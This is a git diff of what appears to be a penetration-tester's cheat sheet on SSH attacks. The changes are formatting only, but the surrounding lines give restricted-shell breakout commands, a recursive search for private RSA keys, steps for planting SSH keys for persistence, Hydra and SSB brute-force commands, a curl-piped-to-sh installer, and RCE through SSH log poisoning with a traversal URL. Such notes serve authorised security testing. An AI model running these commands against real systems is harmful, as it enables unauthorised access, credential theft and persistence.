@@ -14,6 +14,7 @@ nav_order: 4-2
 - If able to write, drop a SSH key into the user or root directory for login (/root/.ssh/id_rsa)
 - Are you able to read the SSH logs (SSH Log Poisoning): /var/log/auth.log
 
+<br/>
 #### Restrictive Shell
 If you have access to the <i>echo</i> command it is possible to use the built-in API to break out:
 ``` echo os.system("/bin/bash")```
@@ -22,6 +23,7 @@ Break out of <b> RBash </b>:
 OR
 ```ssh user@$IP "/bin/sh"```
 
+<br />
 #### Check the following locations for private keys:
 <ul>
 <li>/home/* </li>
@@ -31,6 +33,7 @@ OR
 <li> ~/.ssh/*</li>
 </ul>
 
+<br />
 #### Identify the host for the private key:
 Check the following locations:
 <ul>
@@ -40,6 +43,7 @@ Check the following locations:
 <li> ~/.ssh/config </li>
 </ul>
 
+<br />
 #### Command Reference
 <b> Search for files containing SSH Keys:</b>
 ```grep -ir "-----BEGIN RSA PRIVATE KEY-----" /home/*```
@@ -57,12 +61,14 @@ Drop the 'new-key-name.pub' file into the target /home/usr/.ssh directory.
 Connect with:
 ```ssh -i new-key-name user@$IP```
 
+<br />
 ### Tools
 - <a href="https://github.com/pwnesia/ssb"> Secure Shell Bruteforcer (SSB) </a>
 ```curl -sSfL 'https://git.io/kitabisa-ssb' | sh -s -- -b /usr/local/bin ```
 ```ssb [-p port] [-w wordlist.txt] [-t timeout]
       [-c concurrent] [-r retries] [-o output] [user@]hostname```
 
+<br />
 #### SSH Log Poisoning
 RCE via SSH Log Poisoning:
 Example PHP web server (capable of viewing the logs):
@@ -72,12 +78,13 @@ Example PHP web server (capable of viewing the logs):
 ``` https://example.com/somefile.php?file=../../../../var/log/auth.log&cmd=id ```
 > reopen the file, scroll down and find the results of the command printed
 
-
+<br />
 #### SSH Brute Force
 - Hydra
 ``` hydra -V -L UserList -P PasswordList ssh://$IP ```
 - SSB
 
+<br />
 #### SSH 'should' be running?
 - Is there a HTTP proxy on the server? SSH may be running but not open to the world - instead of on 0.0.0.0, it may be local on 127.0.0.1
 - If this is the case, it is possible to forward out the loopback address with <b> proxytunnel </b>
@@ -85,5 +92,6 @@ Example PHP web server (capable of viewing the logs):
 > Spawn a daemon on our attacking machine (accessible on 4444)
 ``` ssh user@127.0.0.1 -p 4444 ```
 
+<br />
 ###### [REFERENCES]
 <a href="https://highon.coffee/blog/ssh-lateral-movement-cheat-sheet/#what-is-a-lateral-movement"> SSH Lateral Movement Cheatsheet </a>
